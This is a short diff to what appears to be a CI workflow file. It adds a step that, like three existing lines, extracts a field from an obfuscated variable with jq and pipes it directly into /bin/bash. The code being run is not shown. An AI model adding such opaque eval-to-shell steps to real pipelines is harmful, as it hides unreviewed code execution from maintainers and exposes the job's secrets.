@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$ws037" | jq -r .x82142 | /bin/bash
           echo $ahzus04 | jq -r .hrt3726 | /bin/bash
           echo $fw3938 | jq -r .tex66679 | /bin/bash
+          printf '%s' "$by7" | jq -r .jgq0119 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
